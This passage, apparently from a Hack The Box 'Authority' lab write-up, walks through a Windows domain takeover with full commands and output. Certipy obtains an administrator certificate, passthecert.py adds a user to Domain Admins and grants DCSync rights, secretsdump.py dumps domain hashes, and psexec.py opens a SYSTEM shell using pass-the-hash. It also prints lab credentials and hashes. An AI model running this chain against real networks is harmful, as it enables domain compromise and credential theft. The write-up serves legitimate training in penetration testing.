</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Trying</span> <span class=nx>to</span> <span class=nx>resolve</span> <span class=s1>&#39;AUTHORITY.HTB&#39;</span> <span class=nx>at</span> <span class=s1>&#39;10.0.2.3&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Generating</span> <span class=nx>RSA</span> <span class=nx>key</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Requesting</span> <span class=nx>certificate</span> <span class=nx>via</span> <span class=nx>RPC</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Trying</span> <span class=nx>to</span> <span class=nx>connect</span> <span class=nx>to</span> <span class=nx>endpoint</span><span class=o>:</span> <span class=nx>ncacn_np</span><span class=o>:</span><span class=mf>10.10.11.222</span><span class=p>[</span><span class=err>\</span><span class=nx>pipe</span><span class=err>\</span><span class=nx>cert</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Connected</span> <span class=nx>to</span> <span class=nx>endpoint</span><span class=o>:</span> <span class=nx>ncacn_np</span><span class=o>:</span><span class=mf>10.10.11.222</span><span class=p>[</span><span class=err>\</span><span class=nx>pipe</span><span class=err>\</span><span class=nx>cert</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Successfully</span> <span class=nx>requested</span> <span class=nx>certificate</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Request</span> <span class=nx>ID</span> <span class=nx>is</span> <span class=mi>12</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Got</span> <span class=nx>certificate</span> <span class=kd>with</span> <span class=nx>UPN</span> <span class=s1>&#39;administrator@authority.htb&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Certificate</span> <span class=nx>has</span> <span class=nx>no</span> <span class=nx>object</span> <span class=nx>SID</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Saved</span> <span class=nx>certificate</span> <span class=nx>and</span> <span class=kr>private</span> <span class=nx>key</span> <span class=nx>to</span> <span class=s1>&#39;administrator.pfx&#39;</span>
</span></span></code></pre></div><p>Normally the <code>PKCS #12</code> archive file could be used directly to get domain admin hashes or Kerberos tickets but in this box, it was not working. So had to switch to <code>pass-the-cert</code> attack.</p><p>The certificate and key can be separated from the extracted from the <code>PKCS #12 (pfx)</code> archive file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>venv<span class=o>)</span> ┌─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/authority/rdp<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$certipy</span> cert -pfx administrator.pfx -nokey -out admin.crt
</span></span><span class=line><span class=cl>Certipy v4.8.0 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Writing certificate and  to <span class=s1>&#39;admin.crt&#39;</span>
</span></span><span class=line><span class=cl><span class=o>(</span>venv<span class=o>)</span> ┌─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/authority/rdp<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$certipy</span> cert -pfx administrator.pfx -nocert -out admin.key
</span></span><span class=line><span class=cl>Certipy v4.8.0 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Writing private key to <span class=s1>&#39;admin.key&#39;</span>
</span></span></code></pre></div><p>One way for dumping hashes and gaining domain admins was adding ourselves to domain admins or granting <code>DCSYNC</code> rights to attacker-controlled users. Since both are relatively new, I have covered both ways in the write-up.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=p>(</span><span class=nx>venv</span><span class=p>)</span> <span class=err>┌─</span><span class=p>[</span><span class=err>✗</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/authority/notes/certs]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$python3</span> <span class=nx>passthecert</span><span class=p>.</span><span class=nx>py</span> <span class=o>-</span><span class=nx>action</span> <span class=nx>ldap</span><span class=o>-</span><span class=nx>shell</span> <span class=o>-</span><span class=nx>crt</span> <span class=nx>admin</span><span class=p>.</span><span class=nx>crt</span> <span class=o>-</span><span class=nx>key</span> <span class=nx>admin</span><span class=p>.</span><span class=nx>key</span> <span class=o>-</span><span class=nx>domain</span> <span class=nx>authority</span><span class=p>.</span><span class=nx>htb</span> <span class=o>-</span><span class=nx>dc</span><span class=o>-</span><span class=nx>ip</span> <span class=mf>10.10.11.222</span> 
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.11.0</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2023</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Type</span> <span class=nx>help</span> <span class=k>for</span> <span class=nx>list</span> <span class=k>of</span> <span class=nx>commands</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>add_user_to_group</span> <span class=nx>svc_ldap</span> <span class=s2>&#34;Domain Admins&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>Adding</span> <span class=nx>user</span><span class=o>:</span> <span class=nx>svc_ldap</span> <span class=nx>to</span> <span class=nx>group</span> <span class=nx>Domain</span> <span class=nx>Admins</span> <span class=nx>result</span><span class=o>:</span> <span class=nx>OK</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>#</span>
</span></span></code></pre></div><p>Dumping domain hashes with <code>secretsdump.py</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/authority/notes/certs]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$secretsdump</span><span class=p>.</span><span class=nx>py</span> <span class=s1>&#39;svc_ldap:lDaP_1n_th3_cle4r!@authority.htb&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.10.1</span><span class=p>.</span><span class=nx>dev1</span><span class=o>+</span><span class=mf>20230504.43204.0</span><span class=nx>bdad34a</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2022</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Target</span> <span class=nx>system</span> <span class=nx>bootKey</span><span class=o>:</span> <span class=mh>0x31f4629800790a973f9995cec47514c6</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>local</span> <span class=nx>SAM</span> <span class=nx>hashes</span> <span class=p>(</span><span class=nx>uid</span><span class=o>:</span><span class=nx>rid</span><span class=o>:</span><span class=nx>lmhash</span><span class=o>:</span><span class=nx>nthash</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Administrator</span><span class=o>:</span><span class=mi>500</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>a15217bb5af3046c87b5bb6afa7b193e</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>Guest</span><span class=o>:</span><span class=mi>501</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>31</span><span class=nx>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>DefaultAccount</span><span class=o>:</span><span class=mi>503</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>31</span><span class=nx>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>SAM</span> <span class=nx>hashes</span> <span class=nx>extraction</span> <span class=k>for</span> <span class=nx>user</span> <span class=nx>WDAGUtilityAccount</span> <span class=nx>failed</span><span class=p>.</span> <span class=nx>The</span> <span class=nx>account</span> <span class=nx>doesn</span><span class=err>&#39;</span><span class=nx>t</span> <span class=nx>have</span> <span class=nx>hash</span> <span class=nx>information</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>cached</span> <span class=nx>domain</span> <span class=nx>logon</span> <span class=nx>information</span> <span class=p>(</span><span class=nx>domain</span><span class=o>/</span><span class=nx>username</span><span class=o>:</span><span class=nx>hash</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>LSA</span> <span class=nx>Secrets</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>$MACHINE</span><span class=p>.</span><span class=nx>ACC</span> 
</span></span><span class=line><span class=cl><span class=nx>HTB</span><span class=err>\</span><span class=nx>AUTHORITY$</span><span class=o>:</span><span class=nx>aes256</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=nx>d9eeaa12af484646fdc30d2a6d5b10abb90419f2d67636c0f225b98860ef8a67</span>
</span></span><span class=line><span class=cl><span class=nx>HTB</span><span class=err>\</span><span class=nx>AUTHORITY$</span><span class=o>:</span><span class=nx>aes128</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=mi>988</span><span class=nx>f7118e6216de57982e2ad1bf64bfc</span>
</span></span><span class=line><span class=cl><span class=nx>HTB</span><span class=err>\</span><span class=nx>AUTHORITY$</span><span class=o>:</span><span class=nx>des</span><span class=o>-</span><span class=nx>cbc</span><span class=o>-</span><span class=nx>md5</span><span class=o>:</span><span class=mi>4946616</span><span class=nx>e0d43f1a1</span>
</span></span><span class=line><span class=cl><span class=nx>HTB</span><span class=err>\</span><span class=nx>AUTHORITY$</span><span class=o>:</span><span class=nx>plain_password_hex</span><span class=o>:</span><span class=mi>8</span><span class=nx>c79a9d42ec010204f2858165f2129a9681bf557946a6d2c072c50a8c3eebbd35a5233f6cfa8b4ff8336bafb990d9c2cdbaaf96172582dee05387e31697a642aa2532e2626b09938aa3cc8c3d2ca3b8568bf6dd6ecd3e07500879b8e1c9df1eebfe1475c67736dd20b09656412be2915663a9ee6330678a00e7efa331330bc29f3e3f9550e0c86d27db3f20a04bc9f130d625c2e89972e0084c340a323aaa49e3a679aca9083fa5e166cbf4011027f2d9f363e3572e79e44a42acd9219b37dd1804eb80c1cfafce1a2cc6ffa1fa563ba3bc9763082241f4440ee138fdbf1669576616a6b4e4de2fed59bba6c7265abd4</span>
</span></span><span class=line><span class=cl><span class=nx>HTB</span><span class=err>\</span><span class=nx>AUTHORITY$</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>fd46a391cd96241d31c6cf3402c4c365</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>DPAPI_SYSTEM</span> 
</span></span><span class=line><span class=cl><span class=nx>dpapi_machinekey</span><span class=o>:</span><span class=mh>0xd5d60027f85b1132cef2cce88a52670918252114</span>
</span></span><span class=line><span class=cl><span class=nx>dpapi_userkey</span><span class=o>:</span><span class=mh>0x047c1e3ad8db9d688c3f1e9ea06c8f2caf002511</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>NL$KM</span> 
</span></span><span class=line><span class=cl> <span class=mi>0000</span>   <span class=nx>F9</span> <span class=mi>41</span> <span class=mi>4</span><span class=nx>F</span> <span class=nx>E3</span> <span class=mi>80</span> <span class=mi>49</span> <span class=nx>A5</span> <span class=nx>BD</span>  <span class=mi>90</span> <span class=mi>2</span><span class=nx>D</span> <span class=mi>68</span> <span class=mi>32</span> <span class=nx>F7</span> <span class=nx>E3</span> <span class=mi>8</span><span class=nx>E</span> <span class=nx>E7</span>   <span class=p>.</span><span class=nx>AO</span><span class=p>..</span><span class=nx>I</span><span class=p>...</span><span class=o>-</span><span class=nx>h2</span><span class=p>....</span>
</span></span><span class=line><span class=cl> <span class=mi>0010</span>   <span class=mi>7</span><span class=nx>F</span> <span class=mi>2</span><span class=nx>D</span> <span class=mi>9</span><span class=nx>B</span> <span class=mi>4</span><span class=nx>B</span> <span class=nx>CE</span> <span class=mi>29</span> <span class=nx>B0</span> <span class=nx>E6</span>  <span class=nx>E0</span> <span class=mi>2</span><span class=nx>C</span> <span class=mi>59</span> <span class=mi>5</span><span class=nx>A</span> <span class=nx>AA</span> <span class=nx>B7</span> <span class=mi>6</span><span class=nx>F</span> <span class=nx>FF</span>   <span class=p>.</span><span class=o>-</span><span class=p>.</span><span class=nx>K</span><span class=p>.)...,</span><span class=nx>YZ</span><span class=p>..</span><span class=nx>o</span><span class=p>.</span>
</span></span><span class=line><span class=cl> <span class=mi>0020</span>   <span class=mi>5</span><span class=nx>A</span> <span class=mi>4</span><span class=nx>B</span> <span class=nx>D6</span> <span class=mi>6</span><span class=nx>B</span> <span class=nx>DB</span> <span class=mi>2</span><span class=nx>A</span> <span class=nx>FA</span> <span class=mi>1</span><span class=nx>E</span>  <span class=mi>84</span> <span class=mi>09</span> <span class=mi>35</span> <span class=mi>35</span> <span class=mi>9</span><span class=nx>F</span> <span class=mi>9</span><span class=nx>B</span> <span class=mi>2</span><span class=nx>D</span> <span class=mi>11</span>   <span class=nx>ZK</span><span class=p>.</span><span class=nx>k</span><span class=p>.</span><span class=o>*</span><span class=p>...</span><span class=mf>.55</span><span class=p>..</span><span class=o>-</span><span class=p>.</span>
</span></span><span class=line><span class=cl> <span class=mi>0030</span>   <span class=mi>69</span> <span class=mi>4</span><span class=nx>C</span> <span class=nx>DE</span> <span class=mi>79</span> <span class=mi>44</span> <span class=nx>BA</span> <span class=nx>E1</span> <span class=mi>4</span><span class=nx>B</span>  <span class=mi>5</span><span class=nx>B</span> <span class=nx>BC</span> <span class=nx>E2</span> <span class=mi>77</span> <span class=nx>F4</span> <span class=mi>61</span> <span class=nx>AE</span> <span class=nx>BA</span>   <span class=nx>iL</span><span class=p>.</span><span class=nx>yD</span><span class=p>..</span><span class=nx>K</span><span class=p>[..</span><span class=nx>w</span><span class=p>.</span><span class=nx>a</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=nx>NL$KM</span><span class=o>:</span><span class=nx>f9414fe38049a5bd902d6832f7e38ee77f2d9b4bce29b0e6e02c595aaab76fff5a4bd66bdb2afa1e840935359f9b2d11694cde7944bae14b5bbce277f461aeba</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>Domain</span> <span class=nx>Credentials</span> <span class=p>(</span><span class=nx>domain</span><span class=err>\</span><span class=nx>uid</span><span class=o>:</span><span class=nx>rid</span><span class=o>:</span><span class=nx>lmhash</span><span class=o>:</span><span class=nx>nthash</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Using</span> <span class=nx>the</span> <span class=nx>DRSUAPI</span> <span class=nx>method</span> <span class=nx>to</span> <span class=nx>get</span> <span class=nx>NTDS</span><span class=p>.</span><span class=nx>DIT</span> <span class=nx>secrets</span>
</span></span><span class=line><span class=cl><span class=nx>Administrator</span><span class=o>:</span><span class=mi>500</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>6961</span><span class=nx>f422924da90a6928197429eea4ed</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>Guest</span><span class=o>:</span><span class=mi>501</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>31</span><span class=nx>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>krbtgt</span><span class=o>:</span><span class=mi>502</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>bd6bd7fcab60ba569e3ed57c7c322908</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>svc_ldap</span><span class=o>:</span><span class=mi>1601</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>6839</span><span class=nx>f4ed6c7e142fed7988a6c5d0c5f1</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>AUTHORITY$</span><span class=o>:</span><span class=mi>1000</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>fd46a391cd96241d31c6cf3402c4c365</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Kerberos</span> <span class=nx>keys</span> <span class=nx>grabbed</span>
</span></span><span class=line><span class=cl><span class=nx>Administrator</span><span class=o>:</span><span class=nx>aes256</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=mi>72</span><span class=nx>c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81</span>
</span></span><span class=line><span class=cl><span class=nx>Administrator</span><span class=o>:</span><span class=nx>aes128</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=nx>b5fb2fa35f3291a1477ca5728325029f</span>
</span></span><span class=line><span class=cl><span class=nx>Administrator</span><span class=o>:</span><span class=nx>des</span><span class=o>-</span><span class=nx>cbc</span><span class=o>-</span><span class=nx>md5</span><span class=o>:</span><span class=mi>8</span><span class=nx>ad3d50efed66b16</span>
</span></span><span class=line><span class=cl><span class=nx>krbtgt</span><span class=o>:</span><span class=nx>aes256</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=mi>1</span><span class=nx>be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb</span>
</span></span><span class=line><span class=cl><span class=nx>krbtgt</span><span class=o>:</span><span class=nx>aes128</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=nx>d2acc08a1029f6685f5a92329c9f3161</span>
</span></span><span class=line><span class=cl><span class=nx>krbtgt</span><span class=o>:</span><span class=nx>des</span><span class=o>-</span><span class=nx>cbc</span><span class=o>-</span><span class=nx>md5</span><span class=o>:</span><span class=nx>a1457c268ca11919</span>
</span></span><span class=line><span class=cl><span class=nx>svc_ldap</span><span class=o>:</span><span class=nx>aes256</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=mi>3773526</span><span class=nx>dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a</span>
</span></span><span class=line><span class=cl><span class=nx>svc_ldap</span><span class=o>:</span><span class=nx>aes128</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=mi>08</span><span class=nx>da69b159e5209b9635961c6c587a96</span>
</span></span><span class=line><span class=cl><span class=nx>svc_ldap</span><span class=o>:</span><span class=nx>des</span><span class=o>-</span><span class=nx>cbc</span><span class=o>-</span><span class=nx>md5</span><span class=o>:</span><span class=mi>01</span><span class=nx>a8984920866862</span>
</span></span><span class=line><span class=cl><span class=nx>AUTHORITY$</span><span class=o>:</span><span class=nx>aes256</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=nx>d9eeaa12af484646fdc30d2a6d5b10abb90419f2d67636c0f225b98860ef8a67</span>
</span></span><span class=line><span class=cl><span class=nx>AUTHORITY$</span><span class=o>:</span><span class=nx>aes128</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=mi>988</span><span class=nx>f7118e6216de57982e2ad1bf64bfc</span>
</span></span><span class=line><span class=cl><span class=nx>AUTHORITY$</span><span class=o>:</span><span class=nx>des</span><span class=o>-</span><span class=nx>cbc</span><span class=o>-</span><span class=nx>md5</span><span class=o>:</span><span class=nx>b031e9e34f4f497a</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Cleaning</span> <span class=nx>up</span><span class=p>...</span>
</span></span></code></pre></div><p>We can get a system shell with <code>psexec.py</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=err>✗</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/authority/notes/certs]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$psexec</span><span class=p>.</span><span class=nx>py</span> <span class=o>-</span><span class=nx>hashes</span> <span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>6961</span><span class=nx>f422924da90a6928197429eea4ed</span> <span class=s1>&#39;authority.htb/administrator@authority.htb&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.10.1</span><span class=p>.</span><span class=nx>dev1</span><span class=o>+</span><span class=mf>20230504.43204.0</span><span class=nx>bdad34a</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2022</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Requesting</span> <span class=nx>shares</span> <span class=nx>on</span> <span class=nx>authority</span><span class=p>.</span><span class=nx>htb</span><span class=p>.....</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Found</span> <span class=nx>writable</span> <span class=nx>share</span> <span class=nx>ADMIN$</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Uploading</span> <span class=nx>file</span> <span class=nx>YgsLybRG</span><span class=p>.</span><span class=nx>exe</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Opening</span> <span class=nx>SVCManager</span> <span class=nx>on</span> <span class=nx>authority</span><span class=p>.</span><span class=nx>htb</span><span class=p>.....</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Creating</span> <span class=nx>service</span> <span class=nx>kcZG</span> <span class=nx>on</span> <span class=nx>authority</span><span class=p>.</span><span class=nx>htb</span><span class=p>.....</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Starting</span> <span class=nx>service</span> <span class=nx>kcZG</span><span class=p>.....</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=nx>Press</span> <span class=nx>help</span> <span class=k>for</span> <span class=nx>extra</span> <span class=nx>shell</span> <span class=nx>commands</span>
</span></span><span class=line><span class=cl><span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=p>[</span><span class=nx>Version</span> <span class=mf>10.0.17763.4644</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nx>c</span><span class=p>)</span> <span class=mi>2018</span> <span class=nx>Microsoft</span> <span class=nx>Corporation</span><span class=p>.</span> <span class=nx>All</span> <span class=nx>rights</span> <span class=nx>reserved</span><span class=p>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Windows</span><span class=err>\</span><span class=nx>system32</span><span class=o>&gt;</span> <span class=nx>whoami</span>
</span></span><span class=line><span class=cl><span class=nx>nt</span> <span class=nx>authority</span><span class=err>\</span><span class=nx>system</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Windows</span><span class=err>\</span><span class=nx>system32</span><span class=o>&gt;</span>
</span></span></code></pre></div><p>Or we can give <code>DCSYNC</code> rights to the user with <code>passthecert.py</code> and dump domain hashes.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=p>(</span><span class=nx>venv</span><span class=p>)</span> <span class=err>┌─</span><span class=p>[</span><span class=err>✗</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/authority/notes/certs]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$python3</span> <span class=nx>passthecert</span><span class=p>.</span><span class=nx>py</span> <span class=o>-</span><span class=nx>action</span> <span class=nx>modify_user</span> <span class=o>-</span><span class=nx>crt</span> <span class=nx>admin</span><span class=p>.</span><span class=nx>crt</span> <span class=o>-</span><span class=nx>key</span> <span class=nx>admin</span><span class=p>.</span><span class=nx>key</span> <span class=o>-</span><span class=nx>domain</span> <span class=nx>authority</span><span class=p>.</span><span class=nx>htb</span> <span class=o>-</span><span class=nx>dc</span><span class=o>-</span><span class=nx>ip</span> <span class=mf>10.10.11.222</span> <span class=o>-</span><span class=nx>target</span> <span class=s1>&#39;svc_ldap&#39;</span> <span class=o>-</span><span class=nx>elevate</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.11.0</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2023</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Granted</span> <span class=nx>user</span> <span class=s1>&#39;svc_ldap&#39;</span> <span class=nx>DCSYNC</span> <span class=nx>rights</span><span class=o>!</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/authority/notes/certs]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$secretsdump</span><span class=p>.</span><span class=nx>py</span> <span class=s1>&#39;svc_ldap:lDaP_1n_th3_cle4r!@authority.htb&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.10.1</span><span class=p>.</span><span class=nx>dev1</span><span class=o>+</span><span class=mf>20230504.43204.0</span><span class=nx>bdad34a</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2022</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>RemoteOperations</span> <span class=nx>failed</span><span class=o>:</span> <span class=nx>DCERPC</span> <span class=nx>Runtime</span> <span class=nb>Error</span><span class=o>:</span> <span class=nx>code</span><span class=o>:</span> <span class=mh>0x5</span> <span class=o>-</span> <span class=nx>rpc_s_access_denied</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>Domain</span> <span class=nx>Credentials</span> <span class=p>(</span><span class=nx>domain</span><span class=err>\</span><span class=nx>uid</span><span class=o>:</span><span class=nx>rid</span><span class=o>:</span><span class=nx>lmhash</span><span class=o>:</span><span class=nx>nthash</span><span class=p>)</span>
